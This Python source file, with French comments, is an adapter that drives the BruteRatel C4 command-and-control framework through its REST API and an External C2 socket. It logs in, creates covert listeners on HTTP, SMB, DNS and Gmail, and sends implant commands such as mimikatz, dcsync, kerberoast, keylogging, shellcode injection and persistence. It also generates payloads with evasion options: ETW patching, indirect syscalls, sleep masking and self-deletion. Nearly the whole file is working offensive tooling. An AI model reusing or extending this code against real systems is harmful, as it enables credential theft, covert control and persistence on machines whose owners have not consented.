"""
BruteRatel C4 — REST API propriétaire + External C2 SMB/TCP.

BruteRatel C4 (bruteratel.com) — C2 commercial red team.
Port API    : 443  (HTTPS, configurable)
Auth        : POST /api/users/login → token

Endpoints REST API BruteRatel :
  POST /api/users/login            → auth → token
  GET  /api/users                  → opérateurs
  GET  /api/badgers                → liste des badgers (agents)
  GET  /api/badgers/{id}           → détail badger
  POST /api/badgers/{id}/cmd       → envoyer une commande
  GET  /api/badgers/{id}/logs      → logs/résultats
  GET  /api/listeners              → listeners
  POST /api/listeners              → créer listener
  DELETE /api/listeners/{id}       → supprimer listener
  POST /api/payloads/generate      → générer un payload
  GET  /api/payloads               → liste des payloads
  POST /api/externalc2/stage       → External C2 : obtenir le stager
  GET  /api/externalc2/tasks       → External C2 : récupérer les tâches
  POST /api/externalc2/response    → External C2 : envoyer les réponses

Modes (config.extra["mode"]) :
  "api"         — REST API standard (défaut)
  "external_c2" — External C2 socket TCP (port configurable)

Listeners BruteRatel :
  http    — HTTP avec profil Malleable
  https   — HTTPS avec profil Malleable
  smb     — SMB named pipe (pivot)
  tcp     — TCP local (pivot)
  dns     — DNS C&C
  gmail   — Gmail C&C (chiffré)

Commandes (badger commands) :
  inject, shellcode, assembly, powershell, cmd, screenshot,
  keylog, ls, ps, upload, download, sysinfo, ports, net,
  kerberoast, dcsync, mimikatz, persist, spawn, pivot, sleep, exit
"""
from __future__ import annotations

import asyncio
import json
import logging
import struct
import uuid
from base64 import b64decode
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import (
    ExternalC2Interface, C2AuthError, C2ConnectionError,
    FRAME_STAGE, FRAME_TASK, FRAME_RESPONSE, FRAME_PING,
)
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class BruteRatelC2(ExternalC2Interface):
    """
    BruteRatel C4 — REST API management + External C2 optionnel.

    Paramètres extra (config.extra) :
      mode         : "api" | "external_c2"   (défaut: "api")
      ext_c2_port  : int    — port External C2  (défaut: 2233)
      verify_ssl   : bool   (défaut: False)
      api_key      : str    — clé API statique
      profile      : str    — nom du profil Malleable
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "screenshot", "keylogger", "inject",
        "shellcode_injection", "assembly_execution", "powershell",
        "kerberoasting", "dcsync", "mimikatz", "persistence",
        "pivot_smb", "pivot_tcp", "external_c2",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._mode:          str = "api"
        self._api_client:    httpx.AsyncClient | None = None
        self._token:         str = ""

    # ── Connexion ─────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config = config
        self._mode   = config.extra.get("mode", "api")

        if self._mode == "external_c2":
            return await self._connect_external_c2(config)
        return await self._connect_api(config)

    async def _connect_api(self, config: C2Config) -> bool:
        scheme   = "https" if config.ssl else "http"
        base_url = f"{scheme}://{config.host}:{config.port}"

        self._api_client = httpx.AsyncClient(
            base_url=base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=30.0,
        )

        api_key = config.extra.get("api_key", "")
        if api_key:
            self._api_client.headers.update({"X-API-Key": api_key})
            self._token  = api_key
            self._status = C2Status.CONNECTED
            logger.info("BruteRatel : connecté via API Key → %s", base_url)
            return True

        # Auth username/password
        try:
            resp = await self._api_client.post(
                "/api/users/login",
                json={
                    "username": config.username or "admin",
                    "password": config.password or "",
                },
            )
        except httpx.ConnectError as exc:
            raise C2ConnectionError(f"BruteRatel API inaccessible : {exc}") from exc

        if resp.status_code not in (200, 201):
            raise C2AuthError(f"BruteRatel auth échouée [{resp.status_code}]: {resp.text[:200]}")

        data = resp.json()
        self._token = (
            data.get("token")
            or data.get("access_token")
            or (data.get("data") or {}).get("token", "")
        )
        if not self._token:
            raise C2AuthError(f"Token BruteRatel absent : {data}")

        self._api_client.headers.update({"Authorization": f"Bearer {self._token}"})
        self._status = C2Status.CONNECTED
        logger.info("BruteRatel : connecté via JWT → %s", base_url)
        return True

    async def _connect_external_c2(self, config: C2Config) -> bool:
        """Connexion au port External C2 de BruteRatel."""
        ext_port = int(config.extra.get("ext_c2_port", 2233))
        await self._tcp_connect(config.host, ext_port)
        # Réception du stager (FRAME_STAGE)
        try:
            ftype, data = await self._recv_frame()
            if ftype != FRAME_STAGE:
                logger.warning("BruteRatel ExtC2 : frame inattendu 0x%02x (attendu STAGE)", ftype)
        except Exception as exc:
            logger.warning("BruteRatel ExtC2 : pas de stager reçu : %s", exc)

        self._status = C2Status.CONNECTED
        logger.info("BruteRatel : External C2 connecté → %s:%d", config.host, ext_port)
        return True

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._api_client:
            await self._api_client.aclose()
            self._api_client = None
        await super().disconnect()

    async def get_status(self) -> C2Status:
        if self._mode == "external_c2":
            return await super().get_status()
        if not self._api_client:
            return C2Status.DISCONNECTED
        try:
            resp = await self._api_client.get("/api/badgers", timeout=5.0)
            return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
        except Exception:
            return C2Status.ERROR

    # ── Helpers API ───────────────────────────────────────────────────────────

    async def _api_get(self, path: str, **kwargs: Any) -> Any:
        if not self._api_client:
            raise C2ConnectionError("BruteRatel API client non initialisé")
        resp = await self._api_client.get(path, **kwargs)
        resp.raise_for_status()
        return resp.json()

    async def _api_post(self, path: str, **kwargs: Any) -> Any:
        if not self._api_client:
            raise C2ConnectionError("BruteRatel API client non initialisé")
        resp = await self._api_client.post(path, **kwargs)
        resp.raise_for_status()
        return resp.json()

    async def _api_delete(self, path: str) -> None:
        if not self._api_client:
            raise C2ConnectionError("BruteRatel API client non initialisé")
        resp = await self._api_client.delete(path)
        resp.raise_for_status()

    # ── Listeners ─────────────────────────────────────────────────────────────

    _LISTENER_TYPES = ["http", "https", "smb", "tcp", "dns", "gmail"]

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "https").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 443))
        name     = config.get("name", f"brc4-{protocol}-{port}")
        profile  = config.get("profile", self._config.extra.get("profile", "default"))

        body: dict[str, Any] = {
            "name":     name,
            "type":     protocol,
            "host":     host,
            "port":     port,
            "profile":  profile,
        }

        if protocol == "smb":
            body["pipe_name"] = config.get("pipe_name", f"mojo.{uuid.uuid4().hex[:8]}")
        elif protocol == "tcp":
            body["local_host"] = config.get("local_host", "127.0.0.1")
        elif protocol == "dns":
            body["domain"] = config.get("domain", "")
            body["resolver"] = config.get("resolver", "8.8.8.8")
        elif protocol in ("http", "https"):
            body["domains"]     = config.get("domains", [host])
            body["user_agent"]  = config.get("user_agent", "Mozilla/5.0")
            body["endpoints"]   = config.get("endpoints", ["/api/update", "/ms-office/", "/cdn-cgi/"])
            body["sleep"]       = config.get("sleep", 5)
            body["jitter"]      = config.get("jitter", 0)

        if self._mode == "external_c2":
            # Envoi via External C2
            frame_data = json.dumps({"action": "create_listener", **body}).encode()
            await self._send_frame(FRAME_TASK, frame_data)
            ftype, resp_data = await self._recv_frame()
            resp_json = json.loads(resp_data) if resp_data else {}
            lid = str(resp_json.get("id") or uuid.uuid4())
            return Listener(
                id=lid, name=name, c2_type=self._config.c2_type,
                bind_host=host, bind_port=port, protocol=protocol,
                status="running" if resp_json.get("active", True) else "stopped",
            )

        data = await self._api_post("/api/listeners", json=body)
        lid  = str(data.get("id") or data.get("listener_id") or uuid.uuid4())
        return Listener(
            id=lid, name=name, c2_type=self._config.c2_type,
            bind_host=host, bind_port=port, protocol=protocol,
            status="running" if data.get("active", True) else "stopped",
            meta={
                "profile": profile,
                "domains": config.get("domains", []),
            },
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            await self._api_delete(f"/api/listeners/{listener_id}")
            return True
        except Exception as exc:
            logger.error("BruteRatel remove listener : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        data  = await self._api_get("/api/listeners")
        items = data if isinstance(data, list) else data.get("listeners", data.get("data", []))
        return [
            Listener(
                id=str(l.get("id") or uuid.uuid4()),
                name=l.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=l.get("host", "0.0.0.0"),
                bind_port=int(l.get("port", 443)),
                protocol=l.get("type") or l.get("protocol", "https"),
                status="running" if l.get("active", True) else "stopped",
                meta={"profile": l.get("profile", "")},
            )
            for l in items
        ]

    # ── Badgers (agents) ──────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        data  = await self._api_get("/api/badgers")
        items = data if isinstance(data, list) else data.get("badgers", data.get("data", []))
        return [self._parse_badger(b) for b in items]

    def _parse_badger(self, b: dict[str, Any]) -> Implant:
        bid = str(b.get("id") or b.get("badger_id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19].rstrip("Z"), fmt.rstrip("Z"))
                    except ValueError:
                        continue
            return datetime.utcnow()

        priv = b.get("privilege") or b.get("integrity") or ""
        if isinstance(priv, str):
            p = priv.upper()
            if "SYSTEM" in p:
                integrity = "SYSTEM"
            elif "ADMIN" in p or "HIGH" in p:
                integrity = "ADMIN"
            else:
                integrity = "USER"
        else:
            integrity = "USER"

        return Implant(
            id=bid,
            name=b.get("hostname") or bid,
            c2_type=self._config.c2_type,
            listener_id=str(b.get("listener_id") or b.get("listener", "")),
            external_ip=b.get("external_ip") or b.get("ip", ""),
            internal_ip=b.get("internal_ip") or b.get("local_ip", ""),
            hostname=b.get("hostname", ""),
            username=b.get("username") or b.get("user", ""),
            os=b.get("os") or b.get("operating_system", ""),
            arch=b.get("arch") or b.get("architecture", ""),
            pid=int(b.get("pid", 0)),
            process_name=b.get("process") or b.get("process_name", ""),
            integrity=integrity,
            last_checkin=_dt(b.get("last_checkin") or b.get("last_seen")),
            first_seen=_dt(b.get("created_at") or b.get("first_seen")),
            active=not bool(b.get("dead") or b.get("disconnected", False)),
            meta={
                "sleep":   b.get("sleep", 5),
                "jitter":  b.get("jitter", 0),
                "profile": b.get("profile", ""),
                "pivot":   b.get("pivot", False),
            },
        )

    # ── Commandes (badger tasks) ───────────────────────────────────────────────

    _CMD_MAP: dict[str, str] = {
        "shell":      "cmd",
        "cmd":        "cmd",
        "ps":         "powershell",
        "powershell": "powershell",
        "screenshot": "screenshot",
        "keylog":     "keylog",
        "ls":         "ls",
        "ps_list":    "ps",
        "download":   "download",
        "upload":     "upload",
        "inject":     "inject",
        "shellcode":  "shellcode",
        "assembly":   "assembly",
        "sysinfo":    "sysinfo",
        "net":        "net",
        "ports":      "ports",
        "mimikatz":   "mimikatz",
        "dcsync":     "dcsync",
        "kerberoast": "kerberoast",
        "persist":    "persist",
        "spawn":      "spawn",
        "pivot":      "pivot",
        "sleep":      "sleep",
        "exit":       "exit",
        "kill":       "kill",
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "cmd"
        task_type = self._CMD_MAP.get(cmd_lower, "cmd")
        extra     = cmd_parts[1:] + args_list
        task_id   = str(uuid.uuid4())

        body: dict[str, Any] = {
            "type":    task_type,
            "payload": " ".join(extra) if extra else command,
            "args":    extra,
            "timeout": 60,
        }

        # Cas spécifiques
        if task_type == "inject" and extra:
            body["pid"]     = int(extra[0]) if extra[0].isdigit() else 0
            body["payload"] = extra[1] if len(extra) > 1 else ""
        elif task_type in ("download", "upload") and extra:
            body["path"]  = extra[0]
            body["local"] = extra[1] if len(extra) > 1 else ""
        elif task_type == "sleep" and extra:
            body["sleep"]  = int(extra[0]) if extra[0].isdigit() else 5
            body["jitter"] = int(extra[1]) if len(extra) > 1 and extra[1].isdigit() else 0
        elif task_type in ("mimikatz", "dcsync", "kerberoast"):
            body["module"] = task_type
            body["args"]   = extra

        if self._mode == "external_c2":
            frame_data = json.dumps({"action": "task", "agent_id": agent_id, **body}).encode()
            await self._send_frame(FRAME_TASK, frame_data)
            try:
                ftype, resp_data = await asyncio.wait_for(self._recv_frame(), timeout=10.0)
                resp_json = json.loads(resp_data) if resp_data else {}
                task_id = resp_json.get("task_id", task_id)
            except asyncio.TimeoutError:
                pass
            return Task(
                id=task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command, args=args_list,
                status="queued",
                meta={"task_type": task_type, "mode": "external_c2"},
            )

        data = await self._api_post(f"/api/badgers/{agent_id}/cmd", json=body)
        return Task(
            id=str(data.get("id") or data.get("task_id") or task_id),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command, args=args_list,
            status=data.get("status", "queued"),
            meta={"task_type": task_type},
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        if self._mode == "external_c2":
            # External C2 : résultats reçus via FRAME_RESPONSE
            try:
                ftype, data = await asyncio.wait_for(self._recv_frame(), timeout=5.0)
                if ftype == FRAME_RESPONSE:
                    resp = json.loads(data) if data else {}
                    return {"task_id": task_id, "status": "completed", "output": resp.get("output", "")}
            except (asyncio.TimeoutError, json.JSONDecodeError):
                pass
            return {"task_id": task_id, "status": "pending", "output": ""}

        try:
            data = await self._api_get(f"/api/tasks/{task_id}")
        except Exception:
            data = {}
        return {
            "task_id": task_id,
            "status":  data.get("status", "unknown"),
            "output":  data.get("output") or data.get("result", ""),
        }

    # ── External C2 ───────────────────────────────────────────────────────────

    async def poll_external_c2(self, badger_data: bytes) -> bytes:
        """Relaie les données d'un beacon vers l'External C2 BruteRatel."""
        if self._mode != "external_c2":
            raise C2ConnectionError("Mode External C2 non activé")
        await self._send_frame(FRAME_RESPONSE, badger_data)
        ftype, task_data = await self._recv_frame()
        if ftype == FRAME_TASK:
            return task_data
        return b""

    async def get_stage(self) -> bytes:
        """Récupère le stager External C2."""
        if self._mode == "external_c2" and self._reader:
            try:
                ftype, data = await asyncio.wait_for(self._recv_frame(), timeout=10.0)
                return data if ftype == FRAME_STAGE else b""
            except asyncio.TimeoutError:
                return b""
        # Via API REST
        self._require_connected()
        data = await self._api_post("/api/externalc2/stage", json={
            "listener_id": self._config.extra.get("listener_id", "")
        })
        b64 = data.get("stage") or data.get("data", "")
        return b64decode(b64) if b64 else b""

    # ── Payload ───────────────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        listener_id = config.extra.get("listener_id", "")
        body = {
            "listener_id": listener_id,
            "format":      config.format or "exe",
            "arch":        config.arch or "x64",
            "os":          config.os or "windows",
            "obfuscate":   config.obfuscation,
            "name":        config.name,
            "sleep":       config.extra.get("sleep", 5),
            "jitter":      config.extra.get("jitter", 0),
            "profile":     config.extra.get("profile", ""),
            "options":     {
                "syscall":      config.extra.get("syscall", "indirect"),
                "spoof_args":   config.extra.get("spoof_args", True),
                "etw_patch":    config.extra.get("etw_patch", True),
                "sleep_mask":   config.extra.get("sleep_mask", True),
                "kill_parent":  config.extra.get("kill_parent", False),
                "self_delete":  config.extra.get("self_delete", False),
            },
        }

        data    = await self._api_post("/api/payloads/generate", json=body)
        file_id = data.get("file_id") or data.get("id", "")
        if file_id and self._api_client:
            try:
                resp = await self._api_client.get(f"/api/payloads/{file_id}/download")
                return resp.content
            except Exception:
                pass
        b64 = data.get("data") or data.get("binary", "")
        return b64decode(b64) if b64 else b""

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
